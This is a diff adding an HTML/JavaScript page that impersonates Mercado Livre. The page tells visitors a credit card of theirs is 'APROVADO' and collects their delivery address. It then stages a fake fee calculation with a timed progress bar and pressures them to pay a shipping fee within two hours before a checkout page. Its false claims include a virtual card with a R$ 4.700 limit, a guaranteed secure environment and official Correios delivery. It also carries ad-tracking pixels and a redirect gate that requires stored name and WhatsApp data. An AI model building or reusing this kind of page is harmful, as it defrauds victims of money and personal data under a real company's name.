@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre - Endereço</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <script src="js/utmify-tracker.js"></script>
+    <script src="js/utmify-pixel-tiktok.js"></script>
+    <script src="js/tiktok-pixel-shop.js"></script>
+    <style>
+        .ed-page {
+            background: #f5f5f5;
+            min-height: calc(100vh - 56px);
+            padding: 0 0 32px;
+        }
+
+        .ed-inner {
+            padding: 20px 16px;
+        }
+
+        .ed-title {
+            font-size: 20px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+        }
+
+        .ed-sub {
+            color: #666;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .ed-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 14px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
+        }
+
+        .cep-row {
+            display: flex;
+            align-items: flex-end;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+
+        .cep-row .input-block {
+            flex: 1;
+        }
+
+        .input-block label,
+        .f-label {
+            display: block;
+            font-size: 12px;
+            color: #555;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .input-block input,
+        .f-input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #d0d0d0;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            background: #fff;
+        }
+
+        .input-block input:disabled,
+        .f-input:disabled {
+            background: #f3f3f3;
+            color: #555;
+        }
+
+        .input-block input.cep-err {
+            border-color: #d93025;
+        }
+
+        .nao-cep {
+            font-size: 12px;
+            color: #3483fa;
+            text-decoration: none;
+            white-space: nowrap;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+            font: inherit;
+            text-align: left;
+            width: 100%;
+        }
+
+        .nao-cep:hover {
+            text-decoration: underline;
+        }
+
+        .ed-cidade-uf-wrap {
+            margin-bottom: 24px;
+        }
+
+        #btnCep {
+            margin-top: 20px;
+        }
+
+        .cep-hint {
+            font-size: 12px;
+            color: #00a650;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        .cep-hint.is-on {
+            display: block;
+        }
+
+        .cep-err-txt {
+            font-size: 12px;
+            color: #d93025;
+            margin-bottom: 8px;
+            display: none;
+        }
+
+        .cep-err-txt.is-on {
+            display: block;
+        }
+
+        .btn-continue:disabled,
+        .btn-continue.is-disabled {
+            background: #e0e0e0;
+            color: #666;
+            pointer-events: none;
+            cursor: not-allowed;
+        }
+
+        .row2 {
+            display: flex;
+            gap: 10px;
+        }
+
+        .row2 .input-block {
+            flex: 1;
+        }
+
+        .secure-box {
+            background: #f0f9f4;
+            border: 1px solid #b8e0c8;
+            border-radius: 10px;
+            padding: 16px;
+            margin-top: 16px;
+        }
+
+        .secure-box h3 {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            color: #1a5c2e;
+            font-weight: 800;
+            margin-bottom: 4px;
+        }
+
+        .secure-box p {
+            font-size: 12px;
+            color: #2d6a4f;
+            line-height: 1.5;
+        }
+
+        .secure-sub {
+            font-size: 11px;
+            color: #40916c;
+            margin-top: 2px;
+        }
+
+        .badges-wrap {
+            text-align: center;
+            padding: 20px 12px;
+        }
+
+        .badges-wrap img {
+            max-width: 100%;
+            height: auto;
+            min-height: 48px;
+            object-fit: contain;
+        }
+
+        .badges-placeholder {
+            background: #eee;
+            border-radius: 10px;
+            padding: 24px;
+            color: #999;
+            font-size: 12px;
+        }
+
+        .promo-bubble {
+            background: #fff;
+            border-radius: 10px;
+            padding: 14px;
+            font-size: 13px;
+            line-height: 1.5;
+            margin-bottom: 16px;
+            border: 1px solid #ededed;
+        }
+
+        .promo-bubble strong {
+            color: #1a1a1a;
+        }
+
+        .section-cap {
+            font-size: 12px;
+            font-weight: 800;
+            color: #555;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            margin: 8px 0 10px;
+        }
+
+        .opt {
+            position: relative;
+            border: 2px solid #e5e5e5;
+            border-radius: 10px;
+            padding: 14px 12px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            background: #fff;
+        }
+
+        .opt.active {
+            border-color: #3483fa;
+            background: #f5f8ff;
+        }
+
+        .opt-badge {
+            position: absolute;
+            top: -8px;
+            right: 10px;
+            background: #ff7733;
+            color: #fff;
+            font-size: 9px;
+            font-weight: 800;
+            padding: 3px 8px;
+            border-radius: 4px;
+            letter-spacing: 0.02em;
+        }
+
+        .opt-h {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 4px;
+        }
+
+        .opt-t {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 800;
+            font-size: 15px;
+        }
+
+        .ic-circle {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #e3eeff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #3483fa;
+            flex-shrink: 0;
+        }
+
+        .opt-p {
+            font-weight: 800;
+            font-size: 15px;
+        }
+
+        .opt-d {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .opt-tm {
+            font-size: 12px;
+            font-weight: 700;
+            color: #333;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        #stepCep,
+        #stepCalc,
+        #stepFrete,
+        #stepRes {}
+
+        .calc-box {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .calc-spin {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #eee;
+            border-top-color: #ffe600;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 18px;
+        }
+
+        .bar-wrap {
+            height: 8px;
+            background: #e8e8e8;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .bar-fill {
+            height: 100%;
+            width: 0%;
+            background: #ffe600;
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+
+        .st-list {
+            text-align: left;
+            max-width: 280px;
+            margin: 16px auto 0;
+            font-size: 14px;
+        }
+
+        .st-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            color: #555;
+        }
+
+        .st-ic {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            flex-shrink: 0;
+        }
+
+        .st-ic.ok {
+            background: #00a650;
+            color: #fff;
+        }
+
+        .st-ic.load {
+            background: #3483fa;
+            color: #fff;
+        }
+
+        .res-addr {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #444;
+        }
+
+        .res-sum {
+            background: #f8f8f8;
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .res-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+
+        .foot-sec {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            margin-top: 16px;
+            padding: 0 8px;
+        }
+
+        .res-ok {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #e8f5e9;
+            border: 1px solid #c8e6c9;
+            border-radius: 10px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+        }
+
+        .res-ok p {
+            font-size: 14px;
+            font-weight: 800;
+            color: #1b5e20;
+            margin: 0;
+            line-height: 1.3;
+        }
+
+        .res-ico-ok {
+            flex-shrink: 0;
+        }
+
+        .res-blk {
+            background: #fff;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.06);
+        }
+
+        .res-hd {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .res-hd h3 {
+            font-size: 15px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin: 0;
+        }
+
+        .res-ic-svg {
+            color: #3483fa;
+            flex-shrink: 0;
+            line-height: 0;
+        }
+
+        .res-ic-svg--sm {
+            width: 28px;
+            height: 28px;
+        }
+
+        .res-virt .res-ic-svg-virt {
+            width: 20px;
+            height: 20px;
+            line-height: 0;
+        }
+
+        .res-addr {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.5;
+            white-space: pre-line;
+        }
+
+        .res-kv {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .res-kv span {
+            color: #666;
+        }
+
+        .res-kv strong {
+            color: #1a1a1a;
+            font-weight: 700;
+        }
+
+        .btn-sim {
+            width: 100%;
+            font-size: 15px;
+            font-weight: 800;
+            letter-spacing: 0.02em;
+        }
+
+        .res-virt {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-top: 4px;
+            background: #e8f5e9;
+            border: 1px solid #c8e6c9;
+            border-radius: 10px;
+            padding: 14px;
+            margin-top: 16px;
+        }
+
+        .res-virt p {
+            margin: 0;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #1b5e20;
+        }
+
+        .res-virt strong {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container app-container--funnel">
+        <header>
+            <a href="contato.html" class="header-back" aria-label="Voltar">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                </svg>
+            </a>
+            <div class="header-logo">
+                <img src="images/Mercado-Livre-logo.png" alt="Mercado Livre" width="150" height="36">
+            </div>
+        </header>
+
+        <div class="ed-page">
+            <div class="ed-inner" id="stepCep">
+                <h1 class="ed-title">Endereço de entrega</h1>
+                <p class="ed-sub">Onde você deseja receber seu cartão</p>
+
+                <div class="ed-card">
+                    <div class="cep-row">
+                        <div class="input-block">
+                            <label for="cepInput">CEP</label>
+                            <input type="text" id="cepInput" placeholder="00000-000" maxlength="9" inputmode="numeric"
+                                autocomplete="postal-code" oninput="onCepInput(this)">
+                        </div>
+                    </div>
+                    <button type="button" class="nao-cep" id="btnNaoSeiCep"
+                        aria-label="Preencher endereço sem buscar CEP agora" onclick="abrirFormEnderecoSemCep(event)">
+                        <span
+                            style="width: 14px; height: 14px; border: 2px solid #3483fa; border-radius: 50%; display: inline-block; flex-shrink:0;"></span>
+                        Não sei meu CEP
+                    </button>
+                    <p class="cep-hint" id="cepOk">CEP encontrado! Complete o número e continue.</p>
+                    <p class="cep-err-txt" id="cepErr">CEP não encontrado. Verifique e tente novamente.</p>
+
+                    <div id="blocoEnd" style="display: none; margin-top: 14px;">
+                        <div class="input-block" style="margin-bottom: 12px;">
+                            <label>Endereço</label>
+                            <input type="text" id="logradouro" placeholder="Rua, avenida...">
+                        </div>
+                        <div class="row2">
+                            <div class="input-block">
+                                <label>Número</label>
+                                <input type="text" id="numero" placeholder="Ex: 123" inputmode="numeric">
+                            </div>
+                            <div class="input-block">
+                                <label>Complemento</label>
+                                <input type="text" id="complemento" placeholder="Apto, bloco...">
+                            </div>
+                        </div>
+                        <div class="input-block" style="margin-bottom: 12px;">
+                            <label>Bairro</label>
+                            <input type="text" id="bairro" placeholder="Bairro">
+                        </div>
+                        <div class="row2 ed-cidade-uf-wrap">
+                            <div class="input-block">
+                                <label>Cidade</label>
+                                <input type="text" id="cidade" placeholder="Cidade" oninput="refreshBtnCep()">
+                            </div>
+                            <div class="input-block">
+                                <label>UF</label>
+                                <input type="text" id="uf" maxlength="2" placeholder="UF"
+                                    style="text-transform: uppercase;" oninput="refreshBtnCep()">
+                            </div>
+                        </div>
+                    </div>
+
+                    <button type="button" class="btn btn-yellow btn-continue is-disabled" id="btnCep" disabled
+                        onclick="iniciarCalculo()">Continuar</button>
+                </div>
+
+                <div class="secure-box">
+                    <h3>
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"
+                            aria-hidden="true">
+                            <path d="M12 3L4 6V12C4 16.2 7.1 20.1 12 21C16.9 20.1 20 16.2 20 12V6L12 3Z" fill="#1a5c2e"
+                                opacity="0.9" />
+                            <path d="M8 12L10.5 14.5L16 9" stroke="white" stroke-width="1.8" stroke-linecap="round"
+                                stroke-linejoin="round" />
+                        </svg>
+                        Segurança e privacidade dos seus dados
+                    </h3>
+                    <p class="secure-sub">Entrega oficial com rastreamento garantido</p>
+                    <p style="color: #2d4a3a; font-size: 12px; margin-top: 8px;">A entrega do seu cartão será realizada
+                        pelos Correios com os protocolos de segurança necessários. Ao final da solicitação, você
+                        receberá o endereço de rastreio para acompanhar cada etapa.</p>
+                </div>
+
+                <div class="badges-wrap">
+                    <img id="badgesEntrega" src="images/badges-entrega.png" alt="Correios, SSL e McAfee"
+                        onerror="this.style.display='none'; document.getElementById('badgesPh').style.display='block';"
+                        style="max-height: 56px;">
+                    <div id="badgesPh" class="badges-placeholder" style="display: none;">Placeholder: adicione
+                        <strong>images/badges-entrega.png</strong> (logos Correios, SSL, etc.)
+                    </div>
+                </div>
+            </div>
+
+            <div class="ed-inner" id="stepCalc" style="display: none;">
+                <div class="ed-card calc-box">
+                    <div class="calc-spin" aria-hidden="true"></div>
+                    <h2 class="ed-title" style="margin-top: 8px;">Calculando sua taxa de entrega</h2>
+                    <p class="ed-sub" style="margin-bottom: 8px;">Estamos conferindo rota, prazo e melhor condição para
+                        você.</p>
+                    <div class="bar-wrap">
+                        <div class="bar-fill" id="barCalc"></div>
+                    </div>
+                    <div class="st-list">
+                        <div class="st-item" id="st1">
+                            <span class="st-ic ok" id="ic1" style="opacity:0.4;">✓</span>
+                            <span>Endereço validado</span>
+                        </div>
+                        <div class="st-item" id="st2">
+                            <span class="st-ic load" id="ic2" style="opacity:0.4;">⏱</span>
+                            <span>Estimando melhor prazo de entrega</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="ed-inner" id="stepFrete" style="display: none;">
+                <h1 class="ed-title" style="font-size: 18px;">Escolha o método de envio</h1>
+                <p class="ed-sub">Agora basta escolher a melhor forma para receber seu cartão de crédito
+                    <strong>APROVADO</strong>
+                </p>
+
+                <div class="promo-bubble">
+                    Peça com <strong>Entrega FULL</strong> Mercado Livre e receba seu cartão amanhã.
+                    <div style="font-size: 12px; color: #999; margin-top: 6px;">Finalize seu pedido nas próximas
+                        <strong>2 horas.</strong>
+                    </div>
+                </div>
+
+                <p class="section-cap">Entrega recomendada</p>
+                <div class="opt active" data-code="full" data-label="Entrega FULL" data-price="34.83"
+                    data-prazo="1 dia útil" onclick="selecioneFrete(this)">
+                    <div class="opt-badge">MAIS ESCOLHIDO</div>
+                    <div class="opt-h">
+                        <div class="opt-t">
+                            <span class="ic-circle">
+                                <svg width="16" height="20" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" fill="currentColor" />
+                                </svg>
+                            </span>
+                            <span>Entrega FULL</span>
+                        </div>
+                        <span class="opt-p">R$ 34,83</span>
+                    </div>
+                    <div class="opt-d">Receba mais rápido com separação acelerada no centro logístico.</div>
+                    <div class="opt-tm">🕒 <span>1 dia útil</span></div>
+                </div>
+
+                <p class="section-cap">Outras formas de envio</p>
+                <div class="opt" data-code="sedex" data-label="Entrega SEDEX" data-price="28.36"
+                    data-prazo="5-7 dias úteis" onclick="selecioneFrete(this)">
+                    <div class="opt-h">
+                        <div class="opt-t">
+                            <span class="ic-circle">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M1 3H16L20 7V14H4L1 3Z" stroke="currentColor" stroke-width="1.3" />
+                                    <circle cx="7" cy="19" r="2" />
+                                    <circle cx="19" cy="19" r="2" />
+                                </svg>
+                            </span>
+                            <span>Entrega SEDEX</span>
+                        </div>
+                        <span class="opt-p">R$ 28,36</span>
+                    </div>
+                    <div class="opt-d">Entrega expressa com rastreamento completo.</div>
+                    <div class="opt-tm">🕒 <span>5-7 dias úteis</span></div>
+                </div>
+                <div class="opt" data-code="pac" data-label="Entrega PAC" data-price="17.79"
+                    data-prazo="17-25 dias úteis" onclick="selecioneFrete(this)">
+                    <div class="opt-h">
+                        <div class="opt-t">
+                            <span class="ic-circle">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                    xmlns="http://www.w3.org/2000/svg">
+                                    <rect x="3" y="7" width="18" height="12" rx="1" stroke="currentColor"
+                                        stroke-width="1.3" />
+                                    <path d="M3 11H21" stroke="currentColor" stroke-width="1.3" />
+                                </svg>
+                            </span>
+                            <span>Entrega PAC</span>
+                        </div>
+                        <span class="opt-p">R$ 17,79</span>
+                    </div>
+                    <div class="opt-d">Opção econômica com acompanhamento do envio.</div>
+                    <div class="opt-tm">🕒 <span>17-25 dias úteis</span></div>
+                </div>
+
+                <button type="button" class="btn btn-yellow" style="width: 100%; margin-top: 8px;"
+                    onclick="verResumo()">Continuar</button>
+                <p class="foot-sec">Ambiente 100% seguro: seus dados estão protegidos com criptografia e navegação
+                    segura.</p>
+            </div>
+
+            <div class="ed-inner" id="stepRes" style="display: none;">
+                <div class="res-ok" role="status">
+
+                    <p>Taxa de envio gerada com sucesso!</p>
+                </div>
+
+                <div class="res-blk">
+                    <div class="res-hd">
+                        <span class="res-ic-svg res-ic-svg--sm" aria-hidden="true">
+                            <svg width="28" height="28" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path
+                                    d="M12 2C8.5 2 5.5 5 5.5 8.5C5.5 13 9 16 12 22C15 16 18.5 13 18.5 8.5C18.5 5 15.5 2 12 2Z"
+                                    stroke="currentColor" stroke-width="1.4" fill="none" />
+                                <path d="M9 7H15V6H9V7Z" fill="currentColor" />
+                                <rect x="8.2" y="7.2" width="7.5" height="4.5" rx="0.3" fill="currentColor"
+                                    opacity="0.25" />
+                            </svg>
+                        </span>
+                        <h3>Endereço de entrega</h3>
+                    </div>
+                    <div class="res-addr" id="resAddr">—</div>
+                </div>
+
+                <div class="res-blk">
+                    <div class="res-hd">
+                        <span class="res-ic-svg res-ic-svg--sm" aria-hidden="true">
+                            <svg width="28" height="28" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path d="M1 12L3 7H14V16H1V12Z" fill="currentColor" fill-opacity="0.9" />
+                                <path d="M14 10H18L21 14V16H14V10Z" fill="currentColor" fill-opacity="0.75" />
+                                <circle cx="6" cy="18" r="2" fill="white" />
+                                <circle cx="6" cy="18" r="1.2" fill="currentColor" />
+                                <circle cx="18" cy="18" r="2" fill="white" />
+                                <circle cx="18" cy="18" r="1.2" fill="currentColor" />
+                            </svg>
+                        </span>
+                        <h3 style="line-height: 1.2;">Método de envio</h3>
+                    </div>
+                    <div class="res-kv"><span>Tipo</span><strong id="resMet">—</strong></div>
+                    <div class="res-kv"><span>Prazo</span><strong id="resPrazo">—</strong></div>
+                    <div class="res-kv" style="margin-top:4px"><span>Valor do frete</span><strong
+                            id="resFrete">—</strong></div>
+                </div>
+
+                <a href="../checkout/index.html" class="btn btn-yellow btn-sim" id="btnCheckout">SIM, VOU QUERER!</a>
+
+                <div class="res-virt">
+                    <span class="res-ic-svg-virt" style="color:#1b5e20" aria-hidden="true">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="3" y="5" width="18" height="14" rx="2" stroke="#2E7D32" stroke-width="1.4" />
+                            <line x1="3" y1="9" x2="21" y2="9" stroke="#2E7D32" stroke-width="1.2" />
+                        </svg>
+                    </span>
+                    <p>
+                        <strong>Cartão virtual disponível hoje</strong>
+                        Você receberá hoje seu cartão virtual com limite de R$ 4.700 para começar a usar imediatamente,
+                        enquanto seu cartão físico está a caminho.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script>
+        (function () {
+            try {
+                if (!sessionStorage.getItem("mlNome") || !sessionStorage.getItem("mlWhatsapp")) {
+                    window.location.replace("contato.html");
+                }
+            } catch (e) { }
+        })();
+        var cepValidado = false;
+        var enderecoCep = {};
+        var enderecoLiberadoManual = false;
+
+        function abrirFormEnderecoSemCep(e) {
+            if (e) e.preventDefault();
+            enderecoLiberadoManual = true;
+            var bl = document.getElementById("blocoEnd");
+            if (bl) bl.style.display = "block";
+            document.getElementById("cepErr").classList.remove("is-on");
+            var inp = document.getElementById("cepInput");
+            if (inp) inp.classList.remove("cep-err");
+            document.getElementById("cepOk").classList.remove("is-on");
+            refreshBtnCep();
+        }
+
+        function refreshBtnCep() {
+            var d = (document.getElementById("cepInput").value || "").replace(/\D/g, "");
+            var num = (document.getElementById("numero") && document.getElementById("numero").value || "").trim();
+            var ok = d.length === 8 && num.length >= 1 && (cepValidado || enderecoLiberadoManual);
+            setBtnCep(ok);
+        }
+
+        function onCepInput(el) {
+            el.value = formatCEP(el.value);
+            var d = el.value.replace(/\D/g, "");
+            document.getElementById("cepErr").classList.remove("is-on");
+            document.getElementById("cepOk").classList.remove("is-on");
+            el.classList.remove("cep-err");
+            if (d.length === 8) {
+                buscarCep(d);
+            } else {
+                if (!enderecoLiberadoManual) {
+                    document.getElementById("blocoEnd").style.display = "none";
+                    cepValidado = false;
+                }
+                setBtnCep(false);
+            }
+            refreshBtnCep();
+        }
+
+        function setBtnCep(on) {
+            var b = document.getElementById("btnCep");
+            if (on) { b.removeAttribute("disabled"); b.classList.remove("is-disabled"); }
+            else { b.setAttribute("disabled", "disabled"); b.classList.add("is-disabled"); }
+        }
+
+        function buscarCep(d) {
+            fetch("https://viacep.com.br/ws/" + d + "/json/")
+                .then(function (r) { return r.json(); })
+                .then(function (data) {
+                    if (data.erro) throw new Error("erro");
+                    enderecoCep = data;
+                    document.getElementById("logradouro").value = data.logradouro || "";
+                    document.getElementById("bairro").value = data.bairro || "";
+                    document.getElementById("cidade").value = data.localidade || "";
+                    document.getElementById("uf").value = (data.uf || "").toUpperCase();
+                    document.getElementById("blocoEnd").style.display = "block";
+                    document.getElementById("cepOk").classList.add("is-on");
+                    cepValidado = true;
+                    setBtnCep(false);
+                    refreshBtnCep();
+                })
+                .catch(function () {
+                    document.getElementById("cepErr").classList.add("is-on");
+                    document.getElementById("cepInput").classList.add("cep-err");
+                    if (!enderecoLiberadoManual) {
+                        document.getElementById("blocoEnd").style.display = "none";
+                    }
+                    cepValidado = false;
+                    setBtnCep(false);
+                    refreshBtnCep();
+                });
+        }
+
+        var numeroEl = document.getElementById("numero");
+        if (numeroEl) {
+            numeroEl.addEventListener("input", function () {
+                refreshBtnCep();
+            });
+        }
+
+        function salvarEndereco() {
+            var cep = document.getElementById("cepInput").value;
+            var logradouro = document.getElementById("logradouro").value.trim();
+            var numero = document.getElementById("numero").value.trim();
+            var complemento = document.getElementById("complemento").value.trim();
+            var bairro = document.getElementById("bairro").value.trim();
+            var cidade = document.getElementById("cidade").value.trim();
+            var uf = document.getElementById("uf").value.trim().toUpperCase();
+            try {
+                sessionStorage.setItem("mlCep", cep);
+                sessionStorage.setItem("mlLogradouro", logradouro);
+                sessionStorage.setItem("mlNumero", numero);
+                sessionStorage.setItem("mlComplemento", complemento);
+                sessionStorage.setItem("mlBairro", bairro);
+                sessionStorage.setItem("mlCidade", cidade);
+                sessionStorage.setItem("mlUf", uf);
+            } catch (e) { }
+        }
+
+        function fmtAddr() {
+            var r = (sessionStorage.getItem("mlLogradouro") || "") + ", " + (sessionStorage.getItem("mlNumero") || "");
+            if (sessionStorage.getItem("mlComplemento")) r += " — " + sessionStorage.getItem("mlComplemento");
+            r += "\n" + (sessionStorage.getItem("mlBairro") || "") + " — " + (sessionStorage.getItem("mlCidade") || "") + "/" + (sessionStorage.getItem("mlUf") || "");
+            r += "\nCEP: " + (sessionStorage.getItem("mlCep") || "");
+            return r;
+        }
+
+        function iniciarCalculo() {
+            var dCep = (document.getElementById("cepInput").value || "").replace(/\D/g, "");
+            if (dCep.length !== 8) return;
+            if (!(document.getElementById("numero").value || "").trim()) return;
+            if (!cepValidado && !enderecoLiberadoManual) return;
+            salvarEndereco();
+            document.getElementById("stepCep").style.display = "none";
+            document.getElementById("stepCalc").style.display = "block";
+            window.scrollTo(0, 0);
+            var p = 0;
+            var bar = document.getElementById("barCalc");
+            var durationMs = 4500;
+            var tickMs = 50;
+            var steps = Math.max(1, Math.floor(durationMs / tickMs));
+            var inc = 100 / steps;
+            var t = setInterval(function () {
+                p += inc;
+                if (p > 100) p = 100;
+                bar.style.width = p + "%";
+            }, tickMs);
+            setTimeout(function () { document.getElementById("ic1").style.opacity = "1"; }, Math.floor(durationMs * 0.12));
+            setTimeout(function () { document.getElementById("ic2").style.opacity = "1"; }, Math.floor(durationMs * 0.35));
+            setTimeout(function () {
+                clearInterval(t);
+                bar.style.width = "100%";
+                document.getElementById("stepCalc").style.display = "none";
+                document.getElementById("stepFrete").style.display = "block";
+                window.scrollTo(0, 0);
+            }, durationMs);
+        }
+
+        var freteSelecionado = { code: "full", price: 34.83, prazo: "1 dia útil", label: "Entrega FULL" };
+
+        function selecioneFrete(el) {
+            document.querySelectorAll("#stepFrete .opt").forEach(function (o) { o.classList.remove("active"); });
+            el.classList.add("active");
+            freteSelecionado = {
+                code: el.getAttribute("data-code"),
+                price: parseFloat(el.getAttribute("data-price")),
+                prazo: el.getAttribute("data-prazo"),
+                label: el.getAttribute("data-label") || "Entrega"
+            };
+        }
+
+        function verResumo() {
+            try {
+                salvarEndereco();
+            } catch (e) { }
+            try {
+                if (!sessionStorage.getItem("mlCep") || !sessionStorage.getItem("mlLogradouro") || !sessionStorage.getItem("mlNumero")
+                    || !sessionStorage.getItem("mlBairro") || !sessionStorage.getItem("mlCidade") || !sessionStorage.getItem("mlUf")) {
+                    alert("Endereço incompleto. Preencha CEP, logradouro, número, bairro, cidade e UF.");
+                    return;
+                }
+            } catch (e) {
+                return;
+            }
+            if (!document.querySelector("#stepFrete .opt.active")) {
+                alert("Selecione um método de entrega.");
+                return;
+            }
+            try {
+                sessionStorage.setItem("mlEntrega", freteSelecionado.label);
+                sessionStorage.setItem("mlEntregaCode", freteSelecionado.code);
+                sessionStorage.setItem("mlFreteValor", String(freteSelecionado.price));
+                sessionStorage.setItem("mlEntregaPrazo", freteSelecionado.prazo);
+            } catch (e) { }
+            document.getElementById("resAddr").textContent = fmtAddr();
+            document.getElementById("resMet").textContent = freteSelecionado.label;
+            document.getElementById("resPrazo").textContent = freteSelecionado.prazo;
+            document.getElementById("resFrete").textContent = "R$ " + freteSelecionado.price.toFixed(2).replace(".", ",");
+            document.getElementById("stepFrete").style.display = "none";
+            document.getElementById("stepRes").style.display = "block";
+            window.scrollTo(0, 0);
+        }
+    </script>
+</body>
+
+</html>
